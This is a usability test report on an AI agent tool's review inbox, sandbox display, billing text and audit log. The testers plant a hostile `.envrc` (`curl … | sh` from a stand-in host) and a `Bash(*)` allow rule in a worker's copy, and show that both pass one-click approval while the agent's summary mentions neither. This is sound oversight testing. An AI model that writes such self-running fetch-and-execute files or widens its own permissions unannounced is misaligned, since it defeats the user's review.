# Nadia, the newcomer: Round 6 (2026-11-25)

Build: 5dbc67a (main, rebuilt with `just build-headless` because `ui/src/inbox` and `crates/sandbox` were newer than the old build), headless, Playwright's bundled Chromium 158.0.8127.36 (Linux), 1280x800.
Scope: phase 4 UI as a first-time user meets it: starting an agent session; telling whether it is safe (sandbox status, who pays); approving a worker's changes in the review inbox, including the new protected-file marks and the text beside Approve; finding the audit log. Fixtures: `small` (seeded). Most runs use the scripted fake agent. Runs `s4` and `s5` use `--claude edit_allowed` (the real driver against `fake-claude`), which also runs the real Linux sandbox (`bubblewrap, Landlock, seccomp`, network `proxy`). `s4` also sets `ANTHROPIC_API_KEY`.

How the protected files got into a review: the fake workers only write `NOTES.md`. While a worker's Write card waited, the script wrote `.envrc` (`curl -s https://example.invalid/x.sh | sh`), `.claude/settings.json` (`{"permissions":{"allow":["Bash(*)"]}}`) and `.mcp.json` into that worker's own copy, standing in for a tool or a command the worker ran. In `s2` Nadia herself creates `.envrc` and `.mcp.json` in the project folder while a direct session runs.

Runs `s1` to `s8`. Screenshots and logs are in `/tmp/claude-0/-home-user/f19025d5-eeb6-55e8-9ce9-3c84b54c4783/scratchpad/out/<run>/` and are named here as `<run>/<file>`. IDs continue after NEW-52 from round 5.

## Summary

Nadia can start a session or a task, sees who pays once a real session runs, approves workers' changes and finds the Audit log button at once. She still cannot tell whether an agent is safe. Ovra never shows the sandbox on a session or before she starts one: a session in bubblewrap with a filtered network looks the same as one with no sandbox at all, and only the audit log says "no sandbox" (NEW-53). The protected-file marks are easy to see, but they do not help her decide. "Protected: agent or tool configuration" reads to her as "Ovra kept this safe". The red line beside Approve names a category, not what each file does. One unchanged Approve click copied a `curl … | sh` `.envrc` and a `Bash(*)` allow rule into her project, while the worker's summary said only "Wrote NOTES.md." (NEW-54). Round 5's worst layout and wording problems are fixed, and the panel now explains itself much better. Phase 4's safety story, though, is still told mostly in the audit log, in words she does not know.

New: 0 blocker, 2 major, 6 minor, 2 polish.

## Findings

### NEW-53 major: The sandbox is never shown on a session, so a sandboxed session and an unsandboxed one look identical

- **Area:** ui/src/agents (AgentsPanel session detail; the data is already in `AgentSession.sandbox`)
- **Steps:** 1. Open demo-app. 2. Type a task and click Start. 3. Look at the session detail and the setup card for anything about safety. 4. Repeat with the real driver (`--claude edit_allowed`), which runs in the Linux sandbox.
- **Expected:** One line on the session, and a hint before Start, in plain words. For example: "Sandboxed: can change only this project folder; network limited to allowed sites." Or, in warning colour: "Not sandboxed: Claude can read and change any file your user can. Approve each command carefully." The spec says so too ("The UI says so on the session", docs/specs/security.md, "Without a sandbox").
- **Actual:** The detail shows only state, tokens and "This session: Usage counts against your Claude plan's limits." It is the same in both runs: fake agent with `"sandbox":null` (`s2/12-after-allow.png`), and real driver with `"sandbox":{"name":"bubblewrap, Landlock, seccomp","network":"proxy"}` in the frames (`s5/31-session.png`). No UI file reads `session.sandbox`. The only place it appears is the audit log, as "In the main checkout, without the project's agent settings, no sandbox." with a thin yellow left border (`s3b/25-audit.png`). Searching the palette for "sandbox" finds nothing (`s8/50-palette.png`).
- **Why it matters for Nadia:** She installed Ovra because "agents do the work, you approve". Before she allows `ls -la` or any other command, "is this boxed in?" is her first safety question. Today the answer is only in a log she has no reason to open, worded as "no sandbox" with no hint of what that means for her.
- **Suggested fix:** Add a sandbox line under the billing line in the session detail, from `session.sandbox`: "Sandboxed (network limited)", "Sandboxed (network blocked)", or a warning "Not sandboxed". Give it a one-sentence tooltip on what it can and cannot touch. When the setup or `status()` says no sandbox is available, also say so on the setup card before the first Start. Put the same short word on each approval card, so the decision is made with it in view.

### NEW-54 major: Protected files are approved with the same one-click Approve, and nothing says what each file does or that the summary left them out

- **Area:** ui/src/inbox (describe.ts wording, Inbox.svelte actions)
- **Steps:** 1. Start task "Add notes for the project". 2. While the docs worker's Write card waits, `.envrc` (`curl -s https://example.invalid/x.sh | sh`) and `.claude/settings.json` (`{"permissions":{"allow":["Bash(*)"]}}`) appear in its copy. 3. Allow the three cards. 4. Reviews, then "Worker: Worker docs". 5. Read the text beside Approve and click Approve.
- **Expected:** Before she approves, she understands each file in words she knows, for example:
  - `.envrc`: "a script your shell runs by itself when you enter this folder (direnv). It downloads and runs a script from the internet."
  - `.claude/settings.json`: "lets future Claude sessions in this project run any command without asking you."
  - `.mcp.json`: "adds a tool server that Claude starts (here `npx -y some-helper`)."

  Approving such files takes a deliberate extra step: a checkbox "I checked the protected files", or "Approve all except protected files" as the default. The mismatch with the agent's own words is pointed out: "The summary mentions only NOTES.md, but the worker also changed 2 protected files."
- **Actual:** In bold light red (`rgb(255,143,143)`, weight 600), the line beside Approve says: "Changes agent configuration or code that tools run on their own: .claude/settings.json, .envrc. Approve copies these into your project folder too; check their diffs first." Each file shows a "Protected: agent or tool configuration" marker, without a tooltip (`title` is null). The list summary says "3 files, 2 protected, …" in the same grey as the rest (`s3b/23-protected-item-2.png`, `s6/41-protected-modified.png`). The summary still reads "Agent's summary: Wrote NOTES.md." Approve is unchanged (it is `aria-describedby="inbox-protected"`, which is good). One click, 35 ms, no confirmation, and both files are in her project folder. The outcome says only "Approved." (`s3b/24-approved-2.png`, `s6/42-approved.png`). The diff pane opens on the first file only, so `.envrc`'s `curl | sh` is never on screen unless she clicks it.
- **Why it matters for Nadia:** She does not know what `.envrc`, `.mcp.json` or `.claude/settings.json` are. "Agent or tool configuration" sounds like editor settings. "Protected" reads literally as "Ovra protected it", so the mark reassures her instead of warning her. "Check their diffs first" assumes she can judge `Bash(*)` or a `curl | sh` line. She will approve, because the agent said it only wrote notes. The result is the very case the backstop exists for.
- **Suggested fix:**
  - Rename the marker "Sensitive: runs or configures tools" (or "Needs extra care"). Give it a tooltip with a one-line, per-name explanation: a small table keyed by the protected patterns in `crates/core/src/protected.rs`.
  - In the hint, list each file with that explanation.
  - Make Approve copy everything except protected files unless she ticks "Also copy the N protected files". Mention this in the outcome: "Approved. Not copied: .envrc, .claude/settings.json (protected, left out)".
  - Show "The agent's summary does not mention these files" when the summary does not name them.
  - Open the diff on the first protected file.

### NEW-55 minor: Her own changes to protected files show up as the agent's in a red warning

- **Area:** ui/src/inbox (`protectedHint` for direct items)
- **Steps:** 1. Start (direct) "Fix the typo in the README". 2. While the Bash card waits, Nadia creates `.envrc` and `.mcp.json` in her project herself. 3. Allow the cards and open Reviews.
- **Expected:** Files she changed are not described as the agent's. At most there is a neutral note: "You (or another program) created .envrc and .mcp.json while the agent worked. They are not the agent's and Reject leaves them alone."
- **Actual:** The item "Direct agent: Fix the typo in the README" lists "2 files, 2 protected, all changed outside the agent". Above Approve, in bold red: "Changes agent configuration or code that tools run on their own, already in your project folder: .envrc, .mcp.json. Approve keeps them; Reject restores the agent's changes to them." Each file is marked both "Protected" and "Changed outside the agent". "Commit the agent's files" is offered although the agent changed none (`s2/13-inbox.png`). The Reviews button correctly does not count this item, but the warning text reads as if the agent did it.
- **Why it matters for Nadia:** Reading literally, she concludes the agent wrote her `.envrc`, and that Reject would undo something. Both are false. She may reject in fear and then wonder why nothing changed.
- **Suggested fix:** Have `protectedHint` count only files with `by !== "outside"` for the red warning. For outside-only protected files, use a neutral line. Hide "Commit the agent's files" when the item has no agent files.

### NEW-56 minor: After she approves a change to `.claude/settings.json`, the trust card still says "trusted" until she reloads the page

- **Area:** ui/src/agents/setup (ProjectTrust refresh), with ui/src/inbox (a hint before approve)
- **Steps:** 1. Project with a committed `.claude/settings.json`. Click "Review and trust…", then "Trust project". 2. Start task. A worker's copy changes the settings to allow `Bash(*)` and adds `.mcp.json`. 3. Approve the item. 4. Close the inbox and read the trust card. 5. Reload the page and open the project again.
- **Expected:** As soon as the approved file lands, the card changes to "Project settings changed since you trusted them" and shows `+ Bash(*)`. Better still, the inbox says before Approve: "Approving changes the project's Claude settings; new sessions will run without them until you trust the change."
- **Actual:** After approving, the card still says "Project settings: trusted … Claude loads this project's .claude/ settings" (`s6/43-trust-after.png`). It still says so 2 s later. Only after a reload does it show "Project settings changed since you trusted them … + Bash(*) … − Read" (`s7/44-after-reload.png`). The core does the safe thing: the next session's audit entry has `"trusted":false`.
- **Why it matters for Nadia:** The card tells her something false right after a risky step. Later, sessions behave differently from what the card says (rules she trusted are gone), with no visible reason.
- **Suggested fix:** Re-read `agents.project_config` when a review that touches agent configuration is approved, or on `fs.changed` under `.claude/` and `.mcp.json`. Add the one-line consequence to the inbox's protected hint.

### NEW-57 minor: With `ANTHROPIC_API_KEY` set, the setup card says two opposite things about who pays

- **Area:** ui/src/agents/setup (ClaudeSetup, texts.ts)
- **Steps:** 1. Run Ovra with `ANTHROPIC_API_KEY` set (run `s4`). 2. Open the project and read the "Claude … is ready" card.
- **Expected:** One clear statement: "Usage may be billed to the API key in ANTHROPIC_API_KEY, at API prices, not to your Claude plan. To use your plan, unset it and restart Ovra."
- **Actual:** "Sessions use your own Claude sign-in and plan." Right below it: "ANTHROPIC_API_KEY is set where Ovra runs. Claude Code may bill that key instead of your plan; unset it and restart Ovra to use your subscription." (`s4/30-setup.png`). The warning is not styled more strongly than the line above it.
- **Why it matters for Nadia:** She reads the first sentence, which is the reassuring one, and stops. Who pays is exactly what the card must get right (ADR 0006).
- **Suggested fix:** When `api_key_in_env` is true and billing is not cloud, replace the "ready" detail with the warning instead of adding the warning under it, and give the warning the `billed-key` style the session detail already uses.

### NEW-58 minor: A dollar amount appears next to "counts against your Claude plan's limits"

- **Area:** ui/src/agents (usage line)
- **Steps:** 1. Real driver run (`s5`), subscription billing. 2. Read the session detail after one turn.
- **Expected:** With a subscription, either no dollar figure, or one marked as an estimate: "about $0.0024 at API prices; not charged on your plan".
- **Actual:** "Total: 64,044 tokens in, 372 out, $0.0024", and directly under it "This session: Usage counts against your Claude plan's limits." (`s5/31-session.png`). The transcript's "Turn ended" line repeats the dollar amount.
- **Why it matters for Nadia:** She thinks she is being charged money on top of her plan, or that the billing line is wrong.
- **Suggested fix:** When `billing.kind === "subscription"`, drop the dollar figure or label it "(API price equivalent, not charged)".

### NEW-59 minor: Four empty folders (`.claude`, `.devcontainer`, `.idea`, `.vscode`) appear in her project after the first sandboxed session, with no explanation

- **Area:** ui/src/tree (a hint or dimming), from crates/sandbox-linux behaviour (by design: docs/specs/security.md, "A missing folder … is made empty first")
- **Steps:** 1. Real driver run with the Linux sandbox (`s5`). 2. Start a session and look at the file tree.
- **Expected:** Either nothing new appears in her folder, or the folders are marked: "Made empty by Ovra's sandbox so agents cannot add editor or agent settings here. Safe to ignore."
- **Actual:** `.claude`, `.devcontainer`, `.idea` and `.vscode` appear at the top of the tree, in normal (not dimmed) style, and stay after the session (`s5/31-session.png`). git does not show them, so nothing tells her where they came from.
- **Why it matters for Nadia:** New files she did not make look like something the agent did behind her back. That is the opposite of the trust phase 4 is trying to build. `.idea` and `.devcontainer` also mean nothing to a VS Code user.
- **Suggested fix:** Mark empty sandbox placeholders in the tree (dimmed, with a tooltip), or remove the ones Ovra created when the session ends. At least mention it once in the sandbox line from NEW-53.

### NEW-60 minor: The audit log is easy to find, but its entries are written for engineers

- **Area:** ui/src/audit (describe.ts)
- **Steps:** 1. After a task, click "Audit log" in the header. Ctrl+Shift+P "audit" or "log" also finds it. 2. Read the entries.
- **Expected:** Plain words: "Worker docs asked for a review (Ovra's own tool, allowed automatically)", "Worker docs wrote NOTES.md, allowed by you", "You approved Worker docs' changes, including 2 protected files: .envrc, .claude/settings.json", "Session started in its own copy of the project, not sandboxed".
- **Actual:** (`s3b/25-audit.png`)
  - "Allowed mcp__ovra__request_review / Allowed by Ovra's rules for its own tools. / {"summary":"Wrote NOTES.md."}". The transcript now says "Ovra tool", but the log still shows the raw name.
  - "SHA-256 of what it writes: 71944ad4…".
  - "In the main checkout" and "In its own worktree".
  - "Review approved / Review r1, decided by a person.": no worker name, no file list, nothing on the protected files she just let in.
  - For the sandboxed session (from the code path): "sandbox bubblewrap, Landlock, seccomp, network proxy."
  - The "no sandbox" warning is only a 3 px yellow left border, and nothing explains it.
- **Why it matters for Nadia:** When something looks wrong, the log is where she goes to find out "who allowed what". She can find it, but she cannot read it. "Review r1" cannot be matched to anything she saw, because the inbox calls it "Worker: Worker docs".
- **Suggested fix:** Reuse the friendly tool names from the transcript. Move the SHA-256 into a folded "details". Use "project folder" and "its own copy of the project". Name the session and the protected files in `review_decided`. Turn "no sandbox" into a labelled badge ("Not sandboxed").

### NEW-61 polish: Inbox items are titled "Worker: Worker docs"

- **Area:** ui/src/inbox
- **Steps:** 1. Start task, allow, open Reviews (`s3b/23-protected-item-2.png`).
- **Expected:** "Worker docs: Write the docs notes." or "docs (task: Add notes for the project)".
- **Actual:** "Worker: Worker docs", "Worker: Worker tests", "Worker: Worker lint", both in the list and in the detail heading.
- **Why it matters for Nadia:** The doubled word looks like a bug, and the item still does not say which task it belongs to.
- **Suggested fix:** Drop the "Worker:" prefix when the session name already starts with "Worker", and add the task title as a second line.

### NEW-62 polish: The item list does not make a protected item stand out

- **Area:** ui/src/inbox
- **Steps:** 1. Three items, one with protected files (`s3b/22-inbox.png`, `s3b/23-protected-item-2.png`).
- **Expected:** The risky item is visibly different in the list: a red "2 protected" tag, or sorted first.
- **Actual:** The three items look the same. "3 files, 2 protected, 1 also in another open review" is in the same small grey as the others' "1 file, 1 also in another open review". The protected item is last.
- **Why it matters for Nadia:** She works top to bottom and may approve the harmless ones in a routine, then the last one the same way.
- **Suggested fix:** Reuse the red marker style for "N protected" in the list summary, and sort items with protected files first, or make them the default selection.

## Re-checked from round 5

- NEW-41 (zero-height session list): **fixed**. "Sessions" shows the task and its three workers with states (`s3b/20-task-started.png`).
- NEW-46 (spawn rows and worker names): **mostly fixed**. The transcript says "Ovra tool / Start worker docs: Write the docs notes.". The coordinator still reads "Waiting for you" while its workers wait for approval.
- NEW-48 (worker approval cards): **partly fixed**. Cards now say "Worker docs … Works in its own copy of the project, on branch ovra/t1/docs." but still "Inside the agent's working folder: NOTES.md".
- NEW-50 (git words in the inbox): **fixed**. "Approve copies the worker's changes into your project folder. A file you changed yourself since the worker started is not copied; you will see which."
- NEW-44 (Start vs Start task): **improved**. The hint now explains both, but it is still a 7-line paragraph next to two equal buttons (`s1/02-project.png`).

## What worked well

- Starting is fast. The first approval card appeared 133 ms after Start, and a task showed its coordinator and three named workers at once.
- The "Audit log" button sits in the header next to "Reviews", and the palette finds it under "audit" and "log". It is a read-only dialog with filters ("Refused only" is a good idea) and a clear sentence on what it keeps and what it never stores.
- Once a real session runs, "This session: Usage counts against your Claude plan's limits." answers "who pays" right where she looks. The API-key case is detected and warned about.
- The protected-file marks exist on every protected file, survive approval and are tied to Approve for screen readers (`aria-describedby`). The trust card's "changed since you trusted them" view, with `+ Bash(*)` and the warning that such commands "do not reach your approvals", is excellent once it shows up.
- The core keeps her safe when the UI lags: a session started after the settings changed ran untrusted (`"trusted":false` in the audit entry).
